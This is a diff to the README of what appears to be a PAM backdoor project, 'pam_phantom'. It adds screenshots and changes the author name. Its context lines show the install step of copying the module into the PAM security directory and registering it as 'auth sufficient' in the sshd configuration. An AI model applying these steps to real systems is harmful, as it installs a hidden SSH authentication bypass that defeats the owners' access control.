@@ -116,6 +116,9 @@ After compilation, the shared object is placed inside the PAM module directory u
 sudo mv pam_phantom.so /lib/x86_64-linux-gnu/security/
 sudo chmod 755 /lib/x86_64-linux-gnu/security/pam_phantom.so
 ```
+<p align="center">
+  <img src="assets/1.jpg" width="1000">
+</p>
 
 ### Explanation
 
@@ -138,12 +141,53 @@ The module must be referenced inside the PAM configuration so it is loaded durin
 ```bash id="y1k7sa"
 sudo nano /etc/pam.d/sshd
 ```
+<p align="center">
+  <img src="assets/2.png" width="1000">
+</p>
 
 Add the following line near the top of the file:
 
 ```plaintext id="x7l4zm"
 auth sufficient pam_phantom.so
 ```
+<p align="center">
+  <img src="assets/3.jpg" width="1000">
+</p>
+
+# 📸 Screenshots
+
+<table>
+<tr>
+<td align="center">
+<img src="assets/4.png" width="420"/>
+<br>
+</td>
+
+<td align="center">
+<img src="assets/5.jpg" width="420"/>
+<br>
+</td>
+</tr>
+
+<tr>
+<td align="center">
+<img src="assets/6.png" width="420"/>
+<br>
+</td>
+
+<td align="center">
+<img src="assets/7.jpg" width="420"/>
+<br>
+</td>
+</tr>
+
+<tr>
+<td colspan="2" align="center">
+<img src="assets/8.jpg" width="850"/>
+<br>
+</td>
+</tr>
+</table>
 
 ### Explanation
 
@@ -297,6 +341,5 @@ Unauthorized deployment against third-party systems is unethical and may violate
 
 # 👨‍💻 Author
 
-**Solo_Bird (Ghost)**
+**Govind Ambade**
 
-Cybersecurity Research • Linux Internals • Malware Analysis
